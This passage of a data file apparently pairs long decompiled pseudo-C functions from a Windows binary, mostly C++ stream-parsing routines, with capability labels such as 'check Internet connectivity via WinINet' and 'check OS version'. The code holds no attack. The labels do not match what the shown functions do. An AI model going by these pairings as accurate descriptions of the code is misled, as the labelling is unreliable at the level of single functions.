*(&stack0xffffffffffffff20 + iVar11) = 0x140033556;\n                            iVar7 = (*pcVar5)(piVar10);\n                            if (iVar7 != var_60h) {\n                                pcVar5 = *(*piVar10 + 0x30);\n                                *(&stack0xffffffffffffff20 + iVar11) = 0x14003356d;\n                                iVar7 = (*pcVar5)(piVar10);\n                                if (var_50h_2 != iVar7) goto code_r0x000140033577;\n                            }\n                            bVar27 = true;\n                            piVar23 = piStack144;\n                            uVar12 = auStack184[1];\n                            goto code_r0x000140033590;\n                        }\ncode_r0x000140033577:\n                        uVar22 = uVar22 + 1;\n                    } while (uVar22 != uVar24);\n                    bVar27 = false;\n                    piVar23 = piStack144;\n                    uVar12 = auStack184[1];\ncode_r0x000140033590:\n                    puVar14 = var_58h;\n                    uVar17 = 0;\n                    do {\n                        if ((var_68h == uVar12) == bVar27) {\n                            uVar24 = uVar24 - 1;\n                            iStack120 = uVar24 * 8;\n                            puVar1[uVar17] = puVar1[uVar24];\n                            var_58h[uVar17] = var_58h[uVar24];\n                            if (uVar24 <= uVar17) goto code_r0x0001400335d8;\n                        }\n                        else {\n                            uVar17 = uVar17 + 1;\n                            if (uVar24 <= uVar17) goto code_r0x0001400335d8;\n                        }\n                        uVar12 = var_58h[uVar17];\n                    } while( true );\n                }\n                if (var_68h < uVar17) {\n                    piVar13 = piVar23[2];\n                    if (piVar23[3] <= piVar13) goto code_r0x000140033636;\n                    goto code_r0x0001400331fc;\n                }\ncode_r0x0001400333d0:\n                uVar12 = 0xffffffff;\n            }\n            if (uVar24 == 1) {\n                if (piVar23[2] < piVar23[3]) {\n                    piVar23[2] = piVar23[2] + 2;\n                    var_48h = piVar23;\n                }\n                else {\n                    var_48h = piVar23;\n                    pcVar5 = *(*piVar23 + 0x50);\n                    *(&stack0xffffffffffffff20 + iVar11) = 0x140033942;\n                    (*pcVar5)(piVar23);\n                }\n                uVar24 = *puVar1;\n                var_68h = var_68h + 1;\n                uVar12 = *var_58h;\n                iVar15 = *(noname_5 + uVar24 * 8);\n                piVar23 = var_48h;\n                if (var_68h < uVar12) {\ncode_r0x0001400336a5:\n                    do {\n                        if (piVar23[2] < piVar23[3]) {\n                            iVar7 = *piVar23[2];\n                        }\n                        else {\n                            var_48h = piVar23;\n                            pcVar5 = *(*piVar23 + 0x48);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x140033985;\n                            iVar7 = (*pcVar5)(piVar23);\n                            piVar23 = var_48h;\n                        }\n                        bVar27 = iVar7 == -1;\n                        if (bVar27) {\n                            piVar23 = NULL;\n                        }\ncode_r0x0001400336c7:\n                        uVar21 = uVar24;\n                        uVar20 = piStack136 != NULL & uStack121;\n                        uVar19 = uStack121;\n                        if (uVar20 != 0) {\n                            if (piStack136[2] < piStack136[3]) {\n                                iVar7 = *piStack136[2];\n                                var_48h = piVar23;\n                            }\n                            else {\n                                var_48h = piVar23;\n                                pcVar5 = *(*piStack136 + 0x48);\n                                *(&stack0xffffffffffffff20 + iVar11) = 0x14003396f;\n                                iVar7 = (*pcVar5)();\n                            }\n                            if (iVar7 != -1) {\n                                uVar20 = 0;\n                            }\n                            piVar23 = NULL;\n                            if (iVar7 != -1) {\n                                piVar23 = piStack136;\n                            }\n                            piStack136 = piVar23;\n                            piVar23 = var_48h;\n                            uVar19 = uVar20;\n                        }\n                        if (uVar19 == bVar27) goto code_r0x000140033420;\n                        var_48h = piVar23;\n                        uVar2 = *(iVar15 + var_68h * 2);\n                        pcVar5 = *(*piVar10 + 0x40);\n                        *(&stack0xffffffffffffff20 + iVar11) = 0x1400336fa;\n                        iVar7 = (*pcVar5)(piVar10, uVar2);\n                        piVar23 = var_48h;\n                        if (var_48h == NULL) {\ncode_r0x000140033709:\n                            pcVar5 = *(*piVar10 + 0x40);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x140033717;\n                            iVar9 = (*pcVar5)(piVar10);\n                            if (iVar7 != iVar9) {\n                                uVar2 = *(iVar15 + var_68h * 2);\n                                pcVar5 = *(*piVar10 + 0x30);\n                                *(&stack0xffffffffffffff20 + iVar11) = 0x140033659;\n                                iVar7 = (*pcVar5)(piVar10, uVar2);\n                                var_48h = NULL;\ncode_r0x000140033663:\n                                pcVar5 = *(*piVar10 + 0x30);\n                                *(&stack0xffffffffffffff20 + iVar11) = 0x140033670;\n                                iVar9 = (*pcVar5)(piVar10);\n                                piVar23 = var_48h;\n                                if (iVar9 == iVar7) goto code_r0x00014003367d;\n                                goto code_r0x000140033420;\n                            }\n                            uVar17 = *0x10;\n                            piVar23 = NULL;\n                            if (*0x10 < *0x18) goto code_r0x00014003368b;\ncode_r0x000140033731:\n                            var_48h = piVar23;\n                            pcVar5 = *(*piVar23 + 0x50);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x14003373e;\n                            (*pcVar5)(piVar23);\n                            var_68h = var_68h + 1;\n                            piVar23 = var_48h;\n                            if (uVar12 == var_68h) break;\n                            goto code_r0x0001400336a5;\n                        }\n                        if (var_48h[2] < var_48h[3]) {\n                            iVar9 = *var_48h[2];\n                        }\n                        else {\n                            pcVar5 = *(*var_48h + 0x48);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x140033958;\n                            iVar9 = (*pcVar5)(piVar23);\n                        }\n                        if (iVar9 == -1) goto code_r0x000140033709;\n                        pcVar5 = *(*piVar10 + 0x40);\n                        *(&stack0xffffffffffffff20 + iVar11) = 0x1400337c4;\n                        iVar9 = (*pcVar5)(piVar10);\n                        if (iVar7 != iVar9) {\n                            pcVar5 = *(*piVar10 + 0x30);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x1400337e6;\n                            iVar7 = (*pcVar5)(piVar10);\n                            piVar23 = var_48h;\n                            if (var_48h[2] < var_48h[3]) {\n                                iVar9 = *var_48h[2];\n                            }\n                            else {\n                                pcVar5 = *(*var_48h + 0x48);\n                                *(&stack0xffffffffffffff20 + iVar11) = 0x14003399b;\n                                iVar9 = (*pcVar5)(piVar23);\n                            }\n                            if (iVar9 == -1) {\n                                var_48h = NULL;\n                            }\n                            goto code_r0x000140033663;\n                        }\ncode_r0x00014003367d:\n                        uVar17 = var_48h[2];\n                        piVar23 = var_48h;\n                        if (var_48h[3] <= uVar17) goto code_r0x000140033731;\ncode_r0x00014003368b:\n                        var_68h = var_68h + 1;\n                        piVar23[2] = uVar17 + 2;\n                    } while (uVar12 != var_68h);\n                }\n                else {\ncode_r0x000140033420:\n                    uVar21 = uVar24;\n                    if (uVar12 != var_68h) {\ncode_r0x00014003342d:\n                        uVar12 = 0xffffffff;\n                        goto code_r0x000140033025;\n                    }\n                }\n                uVar8 = 0xffff;\n                *noname_4 = uVar21;\n                goto code_r0x00014003302f;\n            }\n        }\n    }\ncode_r0x000140033025:\n    uVar8 = uVar12;\n    *var_50h = *var_50h | 4;\ncode_r0x00014003302f:\n    *arg1 = piVar23;\n    arg1[1] = piStack168 & 0xffffffffffff0000 | uVar8;\n    return arg1;\ncode_r0x0001400335d8:\n    if (bVar27 == false) {\n        if (uVar24 == 2) {\n            if ((uStack160 & 1) != 0) goto code_r0x00014003342d;\n            uVar24 = *puVar1;\n            uVar17 = uStack160 >> 1;\n            if (uVar24 < uVar17) {\n                if (uVar17 + uVar24 != puVar1[1]) goto code_r0x00014003342d;\n            }\n            else {\n                uVar12 = 0xffffffff;\n                if (uVar24 - uVar17 != puVar1[1]) goto code_r0x000140033025;\n                *puVar1 = uVar24 - uVar17;\n                *puVar14 = puVar14[1];\n                uVar24 = *puVar1;\n            }\n        }\n        else {\n            if (uVar24 != 1) goto code_r0x00014003342d;\n            uVar24 = *puVar1;\n        }\n        iVar15 = *(noname_5 + uVar24 * 8);\n        uVar12 = *var_58h;\n        if (uVar12 <= var_68h) goto code_r0x000140033420;\n        if (piVar23 == NULL) {\n            bVar27 = true;\n            goto code_r0x0001400336c7;\n        }\n        goto code_r0x0001400336a5;\n    }\n    uVar12 = *var_58h;\n    if (1 < uVar24) {\n        puVar14 = puStack152;\n        do {\n            if (*puVar14 < uVar12) {\n                uVar12 = *puVar14;\n            }\n            puVar14 = puVar14 + 1;\n        } while (var_58h + iStack120 != puVar14);\n    }\n    if (uVar12 <= var_68h) goto code_r0x0001400333d0;\n    if (piVar23 != NULL) {\n        piVar13 = piVar23[2];\n        if (piVar13 < piVar23[3]) {\ncode_r0x0001400331fc:\n            iVar7 = *piVar13;\n        }\n        else {\ncode_r0x000140033636:\n            pcVar5 = *(*piVar23 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x140033640;\n            iVar7 = (*pcVar5)(piVar23);\n        }\n        bVar27 = iVar7 == -1;\n        if (bVar27) {\n            piVar23 = NULL;\n        }\n    }\n    uVar20 = piStack136 != NULL & uStack121;\n    uVar19 = uStack121;\n    if (uVar20 != 0) {\n        if (piStack136[2] < piStack136[3]) {\n            iVar7 = *piStack136[2];\n        }\n        else {\n            pcVar5 = *(*piStack136 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x14003385b;\n            iVar7 = (*pcVar5)();\n        }\n        if (iVar7 != -1) {\n            uVar20 = 0;\n        }\n        piVar16 = NULL;\n        if (iVar7 != -1) {\n            piVar16 = piStack136;\n        }\n        piStack136 = piVar16;\n        uVar19 = uVar20;\n    }\n    if (bVar27 == uVar19) goto code_r0x0001400333d0;\n    if (piVar23 == NULL) {\n        iVar15 = *piVar10;\n    }\n    else {\n        if (piVar23[2] < piVar23[3]) {\n            iVar7 = *piVar23[2];\n        }\n        else {\n            pcVar5 = *(*piVar23 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x140033879;\n            iVar7 = (*pcVar5)(piVar23);\n        }\n        iVar15 = *piVar10;\n        pcVar5 = *(iVar15 + 0x40);\n        if (iVar7 != -1) {\n            *(&stack0xffffffffffffff20 + iVar11) = 0x140033262;\n            uVar8 = (*pcVar5)(piVar10);\n            var_50h_2 = var_50h_2 & 0xffffffffffff0000 | uVar8;\n            if (piVar23[2] < piVar23[3]) {\n                iVar7 = *piVar23[2];\n            }\n            else {\n                pcVar5 = *(*piVar23 + 0x48);\n                *(&stack0xffffffffffffff20 + iVar11) = 0x14003386a;\n                iVar7 = (*pcVar5)(piVar23);\n            }\n            if (iVar7 == -1) {\n                iVar7 = -1;\n                piVar23 = NULL;\n            }\n            pcVar5 = *(*piVar10 + 0x30);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x14003329a;\n            uVar8 = (*pcVar5)(piVar10, iVar7);\n            goto joined_r0x00014003329f;\n        }\n    }\n    piVar23 = NULL;\n    pcVar5 = *(iVar15 + 0x40);\n    *(&stack0xffffffffffffff20 + iVar11) = 0x140033369;\n    uVar8 = (*pcVar5)(piVar10, 0xffff);\n    var_50h_2 = var_50h_2 & 0xffffffffffff0000 | uVar8;\n    pcVar5 = *(*piVar10 + 0x30);\n    *(&stack0xffffffffffffff20 + iVar11) = 0x14003337b;\n    uVar8 = (*pcVar5)(piVar10, 0xffff);\njoined_r0x00014003329f:\n    if (uVar24 == 0) {\n        uVar12 = 0xffffffff;\n        goto code_r0x000140033025;\n    }\n    piStack144 = piVar23;\n    uVar12 = 0;\n    var_60h = var_60h & 0xffffffffffff0000 | uVar8;\n    var_48h = var_68h * 2;\n    do {\n        while( true ) {\n            uVar2 = *(var_48h + *(noname_5 + puVar1[uVar12] * 8));\n            pcVar5 = *(*piVar10 + 0x40);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x140033325;\n            iVar7 = (*pcVar5)(piVar10, uVar2);\n            if (iVar7 != var_50h_2) break;\ncode_r0x00014003332b:\n            uVar12 = uVar12 + 1;\n            if (uVar24 <= uVar12) goto code_r0x000140033334;\n        }\n        pcVar5 = *(*piVar10 + 0x30);\n        *(&stack0xffffffffffffff20 + iVar11) = 0x1400332cd;\n        iVar7 = (*pcVar5)(piVar10);\n        if (var_60h == iVar7) goto code_r0x00014003332b;\n        uVar24 = uVar24 - 1;\n        iStack120 = uVar24 * 8;\n        puVar1[uVar12] = puVar1[uVar24];\n        var_58h[uVar12] = var_58h[uVar24];\n    } while (uVar12 < uVar24);\ncode_r0x000140033334:\n    piVar23 = piStack144;\n    if (uVar24 < 2) goto code_r0x0001400333d0;\n    uVar12 = *var_58h;\n    goto code_r0x000140033190;\n}\n",
        "token_count": 7447
    },
    "14003615": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140036150(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4, int32_t *noname_4, int64_t noname_5, \n                  int64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                  ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    ulong uVar4;\n    int16_t iVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int64_t *piVar8;\n    int64_t iVar9;\n    int64_t *piVar10;\n    int64_t *piVar11;\n    bool bVar12;\n    int64_t *piVar13;\n    uchar *puVar14;\n    bool bVar15;\n    uint64_t uVar16;\n    int64_t iVar17;\n    uint64_t *puVar18;\n    bool bVar19;\n    int64_t *piVar20;\n    int64_t *piVar21;\n    int64_t *piVar22;\n    uint16_t uVar23;\n    uint64_t uVar24;\n    ulong var_8h_2;\n    int32_t iVar25;\n    uint32_t *var_bp_50h;\n    ulong uStack160;\n    uchar auStack152 [32];\n    ulong uStack120;\n    int64_t *piStack112;\n    int64_t *piStack104;\n    int64_t *piStack96;\n    int64_t *piStack88;\n    int64_t *piStack80;\n    ulong var_28h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    piVar10 = arg3[1];\n    piStack88 = *arg4;\n    piVar20 = arg4[1];\n    piVar22 = *arg3;\n    uVar24 = piVar10 & 0xffffffff;\n    piVar13 = noname_7 + 0xd0;\n    uStack160 = 0x14003619d;\n    piStack96 = piVar10;\n    piStack80 = piStack88;\n    piVar8 = fcn.1400b3700(piVar13);\n    uStack160 = 0x1400361b8;\n    iVar9 = fcn.14000e880(piVar13);\n    piVar21 = piStack96;\n    iVar9 = -iVar9;\n    puVar14 = &stack0xffffffffffffff68 + iVar9;\n    piStack88._0_1_ = piStack96 == -1;\n    piVar1 = &stack0xffffffffffffff88 + iVar9;\n    bVar15 = piVar22 != NULL && piStack88;\n    piVar11 = piStack80;\n    bVar19 = bVar15;\n    if (bVar15) {\n        if (piVar22[2] < piVar22[3]) {\n            iVar7 = *piVar22[2];\n        }\n        else {\n            piStack96 = piStack80;\n            piStack80 = piVar21;\n            pcVar3 = *(*piVar22 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar9) = 0x14003666d;\n            piVar13 = piVar22;\n            iVar7 = (*pcVar3)();\n            piVar11 = piStack96;\n            piVar21 = piStack80;\n        }\n        piStack88._0_1_ = false;\n        if (iVar7 == -1) {\n            piVar22 = NULL;\n            bVar19 = false;\n            piStack88._0_1_ = bVar15;\n        }\n    }\n    piStack96._0_1_ = piVar20 == -1;\n    bVar12 = piVar11 != NULL && piStack96;\n    bVar15 = piStack96;\n    if (bVar12) {\n        if (piVar11[2] < piVar11[3]) {\n            iVar7 = *piVar11[2];\n        }\n        else {\n            piStack104 = piVar21;\n            piStack96 = piStack96 & 0xffffffffffffff00 | piStack96;\n            piStack88 = piStack88 & 0xffffffffffffff00 | piStack88;\n            piStack80 = piVar11;\n            pcVar3 = *(*piVar11 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar9) = 0x140036645;\n            iVar7 = (*pcVar3)();\n            piVar13 = piVar11;\n            piVar11 = piStack80;\n            piVar21 = piStack104;\n        }\n        piStack88 = NULL;\n        if (iVar7 != -1) {\n            piStack88 = piVar11;\n        }\n        bVar15 = iVar7 == -1 && bVar12;\n    }\n    if (bVar15 != piStack88) {\n        iVar7 = uVar24;\n        if (bVar19) {\n            if (piVar22[2] < piVar22[3]) {\n                iVar7 = *piVar22[2];\n            }\n            else {\n                piStack96 = piVar21;\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n                pcVar3 = *(*piVar22 + 0x48);\n                *(&stack0xffffffffffffff60 + iVar9) = 0x14003668c;\n                piVar13 = piVar22;\n                iVar7 = (*pcVar3)();\n                piVar21 = piStack96;\n                piStack96._0_1_ = piStack80;\n            }\n            if (iVar7 == -1) {\n                piVar22 = NULL;\n            }\n        }\n        noname_6 = noname_6 * 2;\n        if (noname_6 != 0) {\n            piVar20 = NULL;\n            piStack80 = piStack80 & 0xffffffffffff0000 | piVar10 & 0xffff;\n            iVar17 = 0;\n            piStack104 = piVar22;\n            piStack96 = piStack96 & 0xffffffffffffff00 | piStack96;\n            piStack112 = piVar21;\ncode_r0x000140036491:\n            do {\n                if (**(noname_5 + iVar17 * 8) != iVar7) {\n                    pcVar3 = *(*piVar8 + 0x30);\n                    *(&stack0xffffffffffffff60 + iVar9) = 0x140036482;\n                    piVar13 = piVar8;\n                    iVar5 = (*pcVar3)();\n                    if (iVar5 != iVar7) {\n                        iVar17 = iVar17 + 1;\n                        if (iVar17 == noname_6) break;\n                        goto code_r0x000140036491;\n                    }\n                }\n                piVar1[piVar20] = iVar17;\n                iVar17 = iVar17 + 1;\n                piVar20 = piVar20 + 1;\n            } while (iVar17 != noname_6);\n            piVar22 = piStack104;\n            uVar24 = piStack80 & 0xffff;\n            piVar21 = piStack112;\n            if (piVar20 != NULL) {\n                if (piStack104[2] < piStack104[3]) {\n                    piStack104[2] = piStack104[2] + 2;\n                    piVar10 = piStack112;\n                }\n                else {\n                    iVar17 = *piStack104;\n                    piStack104 = piStack112;\n                    piStack80 = piVar20;\n                    pcVar3 = *(iVar17 + 0x50);\n                    *(&stack0xffffffffffffff60 + iVar9) = 0x1400366af;\n                    piVar13 = piVar22;\n                    (*pcVar3)();\n                    piVar20 = piStack80;\n                    piVar10 = piStack104;\n                }\n                *(&stack0xffffffffffffff60 + iVar9) = 0x1400364f7;\n                iVar17 = fcn.14000e880(piVar13);\n                piVar13 = NULL;\n                iVar17 = -iVar17;\n                puVar14 = &stack0xffffffffffffff68 + iVar17 + iVar9;\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n                piStack96 = piVar10;\n                puVar18 = &stack0xffffffffffffff88 + iVar17 + iVar9;\n                do {\n                    uVar4 = *(noname_5 + piVar1[piVar13] * 8);\n                    *(&stack0xffffffffffffff60 + iVar17 + iVar9) = 0x14003651d;\n                    uVar24 = sub.msvcrt.dll_wcslen(uVar4);\n                    puVar18[piVar13] = uVar24;\n                    piVar13 = piVar13 + 1;\n                } while (piVar20 != piVar13);\n                uVar24 = 0xffffffff;\n                uVar16 = 1;\n                piStack96._0_1_ = piStack80;\n                goto code_r0x000140036208;\n            }\n        }\n    }\n    piStack96 = piVar21;\n    piVar13 = NULL;\n    uVar16 = 0;\n    puVar18 = NULL;\ncode_r0x000140036208:\n    do {\n        uVar23 = uVar24;\n        piStack104._0_1_ = uVar23 == 0xffff;\n        bVar19 = piVar22 != NULL && piStack104;\n        piStack80._0_1_ = piStack104;\n        if (bVar19) {\n            if (piVar22[2] < piVar22[3]) {\n                iVar7 = *piVar22[2];\n                piStack80._0_1_ = bVar19;\n            }\n            else {\n                piStack112 = piStack112 & 0xffffffffffffff00 | piStack96;\n                piStack104 = piStack104 & 0xffffffffffffff00 | piStack104;\n                piStack80 = piStack80 & 0xffffffffffffff00 | bVar19;\n                pcVar3 = *(*piVar22 + 0x48);\n                *(puVar14 + -8) = 0x1400365fd;\n                iVar7 = (*pcVar3)(piVar22);\n                piStack96._0_1_ = piStack112;\n            }\n            if (iVar7 == -1) {\n                piVar22 = NULL;\n            }\n            else {\n                piStack80._0_1_ = 0;\n            }\n        }\n        piStack112._0_1_ = piStack88 != NULL & piStack96;\n        if (piStack112 == 0) {\n            if (piStack80 == piStack96) break;\n        }\n        else {\n            if (piStack88[2] < piStack88[3]) {\n                iVar7 = *piStack88[2];\n            }\n            else {\n                uStack120._7_1_ = piStack96;\n                piStack112 = piStack112 & 0xffffffffffffff00 | piStack112;\n                piStack104 = piStack104 & 0xffffffffffffff00 | piStack104;\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack80;\n                pcVar3 = *(*piStack88 + 0x48);\n                *(puVar14 + -8) = 0x1400365cf;\n                iVar7 = (*pcVar3)();\n                piStack96._0_1_ = uStack120._7_1_;\n            }\n            if (iVar7 != -1) {\n                piStack112._0_1_ = 0;\n            }\n            piVar10 = NULL;\n            if (iVar7 != -1) {\n                piVar10 = piStack88;\n            }\n            piStack88 = piVar10;\n            if (piStack80 == piStack112) break;\n        }\n        uVar6 = uVar23;\n        if ((piVar22 != NULL) && (piStack104 != 0)) {\n            if (piVar22[2] < piVar22[3]) {\n                uVar6 = *piVar22[2];\n            }\n            else {\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n                pcVar3 = *(*piVar22 + 0x48);\n                *(puVar14 + -8) = 0x1400365a9;\n                uVar6 = (*pcVar3)(piVar22);\n                piStack96._0_1_ = piStack80;\n            }\n            if (uVar6 == 0xffff) {\n                piVar22 = NULL;\n            }\n        }\n        if (piVar13 == NULL) goto code_r0x0001400363e4;\n        piStack80 = piStack80 & 0xffffffffffff0000 | uVar24 & 0xffff;\n        piVar10 = NULL;\n        piVar20 = NULL;\ncode_r0x000140036285:\n        do {\n            if (uVar16 < puVar18[piVar10]) {\n                if (*(*(noname_5 + piVar1[piVar10] * 8) + uVar16 * 2) != uVar6) {\n                    piVar13 = piVar13 + -1;\n                    piVar1[piVar10] = piVar1[piVar13];\n                    puVar18[piVar10] = puVar18[piVar13];\n                    if (piVar13 <= piVar10) break;\n                    goto code_r0x000140036285;\n                }\n            }\n            else {\n                piVar20 = piVar20 + 1;\n            }\n            piVar10 = piVar10 + 1;\n        } while (piVar10 < piVar13);\n        uVar23 = piStack80;\n        if (piVar13 == piVar20) break;\n        if (piVar22[2] < piVar22[3]) {\n            piVar22[2] = piVar22[2] + 2;\n        }\n        else {\n            piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n            pcVar3 = *(*piVar22 + 0x50);\n            *(puVar14 + -8) = 0x14003641e;\n            (*pcVar3)(piVar22);\n            piStack96._0_1_ = piStack80;\n        }\n        uVar16 = uVar16 + 1;\n        uVar24 = 0xffffffff;\n    } while( true );\n    if (piVar13 == 0x1) {\n        uVar24 = *puVar18;\njoined_r0x00014003642b:\n        if (uVar24 != uVar16) {\ncode_r0x0001400363e4:\n            *var_bp_50h = *var_bp_50h | 4;\n            goto code_r0x0001400363ee;\n        }\n    }\n    else {\n        if (piVar13 != 0x2) goto code_r0x0001400363e4;\n        if (*puVar18 != uVar16) {\n            uVar24 = puVar18[1];\n            goto joined_r0x00014003642b;\n        }\n    }\n    iVar2 = *piVar1;\n    if (iVar25 <= iVar2) {\n        iVar2 = iVar2 - iVar25;\n    }\n    *noname_4 = iVar2;\ncode_r0x0001400363ee:\n    *arg1 = piVar22;\n    arg1[1] = piStack96 & 0xffffffffffff0000 | uVar23;\n    return;\n}\n",
        "token_count": 3562
    },
    "14003781": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140037f45)\n// WARNING: Removing unreachable block (ram,0x000140038377)\n// WARNING: Removing unreachable block (ram,0x000140038384)\n// WARNING: Removing unreachable block (ram,0x000140037a4e)\n// WARNING: Removing unreachable block (ram,0x000140037a57)\n// WARNING: Removing unreachable block (ram,0x0001400382e8)\n// WARNING: Removing unreachable block (ram,0x000140038881)\n// WARNING: Removing unreachable block (ram,0x00014003888f)\n// WARNING: Removing unreachable block (ram,0x000140038893)\n// WARNING: Removing unreachable block (ram,0x0001400382f6)\n// WARNING: Removing unreachable block (ram,0x000140038303)\n// WARNING: Removing unreachable block (ram,0x000140037a68)\n// WARNING: Removing unreachable block (ram,0x000140037a72)\n// WARNING: Removing unreachable block (ram,0x000140037a80)\n// WARNING: Removing unreachable block (ram,0x000140038340)\n// WARNING: Removing unreachable block (ram,0x000140037a88)\n// WARNING: Removing unreachable block (ram,0x0001400379f6)\n// WARNING: Removing unreachable block (ram,0x000140037a04)\n// WARNING: Removing unreachable block (ram,0x000140038128)\n// WARNING: Removing unreachable block (ram,0x000140037a08)\n// WARNING: Removing unreachable block (ram,0x000140037a10)\n// WARNING: Removing unreachable block (ram,0x0001400382d0)\n// WARNING: Removing unreachable block (ram,0x00014003885f)\n// WARNING: Removing unreachable block (ram,0x000140038870)\n// WARNING: Removing unreachable block (ram,0x000140038878)\n// WARNING: Removing unreachable block (ram,0x00014003887c)\n// WARNING: Removing unreachable block (ram,0x0001400382de)\n// WARNING: Removing unreachable block (ram,0x000140037a27)\n// WARNING: Removing unreachable block (ram,0x000140037a29)\n// WARNING: Removing unreachable block (ram,0x000140037a36)\n// WARNING: Removing unreachable block (ram,0x000140037a3e)\n// WARNING: Removing unreachable block (ram,0x0001400380f0)\n// WARNING: Removing unreachable block (ram,0x0001400380fe)\n// WARNING: Removing unreachable block (ram,0x000140038118)\n// WARNING: Removing unreachable block (ram,0x00014003811c)\n// WARNING: Removing unreachable block (ram,0x000140037a40)\n// WARNING: Removing unreachable block (ram,0x000140038350)\n// WARNING: Removing unreachable block (ram,0x00014003835e)\n// WARNING: Removing unreachable block (ram,0x000140038448)\n// WARNING: Removing unreachable block (ram,0x000140037f4c)\n\nint64_t ** fcn.140037810(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    char cVar5;\n    int32_t iVar6;\n    int64_t arg3_00;\n    int64_t **ppiVar7;\n    uint64_t uVar8;\n    int64_t *arg1_00;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iStack256;\n    uint uStack140;\n    uchar *puStack136;\n    uint64_t uStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar *puStack104;\n    uint64_t uStack96;\n    uchar auStack88 [24];\n    \n    piVar2 = arg3[1];\n    piVar3 = arg4[1];\n    piVar10 = *arg3;\n    piVar4 = *arg4;\n    fcn.1400b36a0(in_stack_00000028 + 0xd0);\n    arg3_00 = fcn.1400261c0(0x1400fb780);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + arg3_00 * 8;\n    iVar12 = *piVar1;\n    if (iVar12 == 0) {\n        arg1_00 = fcn.1400b6520(0x70);\n        *(arg1_00 + 1) = 0;\n        iVar12 = *0x1401033d0;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *arg1_00 = iVar12 + 0x10;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x21) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x6f) = 0;\n        fcn.140099da0(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.14009d930(*(in_stack_00000028 + 0xd0), arg1_00, arg3_00);\n        iVar12 = *piVar1;\n    }\n    uStack128 = 0;\n    uStack120 = 0;\n    puStack136 = &uStack120;\n    if (*(iVar12 + 0x20) != '\\0') {\n        fcn.1400a3070(&puStack136, 0x20);\n    }\n    uStack96 = 0;\n    auStack88[0] = 0;\n    puStack104 = auStack88;\n    fcn.1400a3070(&puStack104, 0x20);\n    uStack140 = *(iVar12 + 0x60);\n    iStack256 = 0;\n    do {\n        if (*(&uStack140 + iStack256) < 5) {\n    // WARNING: Could not recover jumptable at 0x0001400379cb. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x1400fdd80\n            ppiVar7 = (*(*(*(&uStack140 + iStack256) * 4 + 0x1400fdd80) + 0x1400fdd80))();\n            return ppiVar7;\n        }\n        iVar6 = iStack256;\n        iStack256 = iStack256 + 1;\n    } while (iVar6 + 1 < 4);\n    if ((uStack96 < 2) || (uVar8 = fcn.1400298f0(&puStack104, 0x30, 0),  uVar8 == 0)) goto code_r0x00014003836d;\n    if (uVar8 == 0xffffffffffffffff) {\n        uVar8 = uStack96 - 1;\n        if (uStack96 == 0) {\n            *puStack104 = 0;\n            goto code_r0x00014003836d;\n        }\n        if (uVar8 == 0) goto code_r0x00014003836d;\n    }\n    uVar11 = uStack96;\n    if (uVar8 < uStack96) {\n        uVar11 = uVar8;\n    }\n    fcn.1400a3120(&puStack104, 0, uVar11);\ncode_r0x00014003836d:\n    uVar8 = uStack128;\n    if (uStack128 != 0) {\n        uVar11 = uStack128 + 1;\n        if (puStack136 == &uStack120) {\n            uVar9 = 0xf;\n        }\n        